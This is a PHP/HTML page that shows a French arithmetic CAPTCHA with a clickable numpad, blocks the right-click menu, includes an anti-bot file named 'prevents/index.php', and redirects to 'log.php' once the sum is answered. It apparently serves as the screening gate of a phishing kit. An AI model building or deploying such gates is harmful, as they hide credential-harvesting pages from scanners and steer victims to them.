<?php
require 'prevents/index.php';


?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<script> document.addEventListener("contextmenu", function (e) {
    e.preventDefault();
}); 
		</script>
    <meta charset="UTF-8">
    <title>CAPTCHA</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8; 
            display: flex;
            flex-direction: column;
            align-items: center;
            margin: 0;
        }

        .header {
            width: 100%;
            background-color: #f8f8f8; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100px;  
            margin: 0; 
        }

        .logo {
            width: 303px;  
            height: 201px;  
        }

        .header-frame {
            border: 2px solid #f8f8f8; 
            padding: 10px;
        }

        .captcha-container {
            text-align: center;
            background-color: #fff;  
            border-radius: 10px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.3);
            padding: 18px;  
            color: #000;  
            max-width: 320px; 
            width: 100%;
            margin-bottom: 16px;  
        }

        .captcha-question {
            font-size: 15.6px;  
            font-weight: bold;
            color: #000;  
        }

        .captcha-image {
            background-color: #FF8C00;  
            color: #fff;  
            padding: 14.4px;  
            border-radius: 10px;
            font-size: 18.4px;  
            margin: 0 auto;
            width: 92px;  
            margin-top: 14.4px;  
        }

        .captcha-input {
            width: 30%;
            padding: 12px;  
            font-size: 14.4px;  
            border: 1.6px solid #ccc;  
            border-radius: 10px;  
            margin-top: 14.4px;  
        }

        .numpad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            grid-gap: 9.6px;  
            margin-top: 14.4px;  
        }

        .numpad-button {
            background-color: #fff;  
            color: #000;
            padding: 9.6px;  
            font-size: 14px;  
            border: none;
            border-radius: 10px;  
            cursor: pointer;
            transition: background-color 0.13s, transform 0.07s;
			font-weight: bold;
        }

        .numpad-button:hover {
            background-color: #FF8C00;  
        }

        .message {
            font-size: 12px;  
            margin-top: 14.4px;  
        }

        .footer {
            background-color: #f8f8f8; 
            height: 2cm;
            width: 100%;
        }

        @media screen and (max-width: 768px) {
            .captcha-container {
                max-width: 80%;
            }
        }
    </style>
</head>
<body>
    <br><br><br><br> 
    
    <div class="header">
        <div class="header-frame">
        </div>
    </div>
    
    <br><br><br><br><br> <!-- Quatre balises <br> ajoutées pour augmenter l'espace -->

    <div class="captcha-container">
    <p class="captcha-question">Résolvez ce CAPTCHA pour continuer :</p>
    <div class="captcha-image" id="captcha-image">2 + 8 =</div>
    <input type="text" class="captcha-input" id="captcha-input" placeholder="    Réponse" readonly>
    <div class="numpad">
        <button class="numpad-button" onclick="addToInput(1)">1</button>
        <button class="numpad-button" onclick="addToInput(2)">2</button>
        <button class="numpad-button" onclick="addToInput(3)">3</button>
        <button class="numpad-button" onclick="addToInput(4)"> 4 </button>
        <button class="numpad-button" onclick="addToInput(5)"> 5 </button>
        <button class="numpad-button" onclick="addToInput(6)"> 6 </button>
        <button class="numpad-button" onclick="addToInput(7)"> 7 </button>
        <button class="numpad-button" onclick="addToInput(8)"> 8 </button>
        <button class="numpad-button" onclick="addToInput(9)"> 9 </button>
        <button class="numpad-button" onclick="resetInput()">X</button>
        <button class="numpad-button" onclick="addToInput(0)">0</button>
    </div> <br>
    <button class="numpad-button" onclick="checkCaptcha()">Continuer</button>
    <p class="message" id="message"></p>
</div>


    <div class="footer"></div>

    <script>
		
		
		function resetInput() {
    inputElement.value = ""; // Réinitialiser le champ à une chaîne vide
}

		
		
        let inputElement = document.getElementById("captcha-input");
        let captchaImage = document.getElementById("captcha-image");
        let messageElement = document.getElementById("message");

        function generateCaptcha() {
            const num1 = Math.floor(Math.random() * 10);
            const num2 = Math.floor(Math.random() * 10);
            const result = num1 + num2;

            captchaImage.textContent = `${num1} + ${num2} =`;
            inputElement.value = "";
        }

        function addToInput(value) {
            inputElement.value += value;
        }

        function checkCaptcha() {
            const userInput = inputElement.value;
            const captchaText = captchaImage.textContent;
            const [num1, , num2] = captchaText.split(" ");
            const expectedResult = (parseInt(num1) + parseInt(num2)).toString();

            if (userInput === expectedResult) {
                messageElement.textContent = "CAPTCHA réussi ! Redirection en cours...";
                setTimeout(function () {
                    
                    window.location.href = 'log.php';
                    
                }, 2000);
            } else {
                messageElement.textContent = "La réponse est incorrecte. Réessayez.";
                generateCaptcha();
            }
        }

        generateCaptcha();
    </script>


</body></html>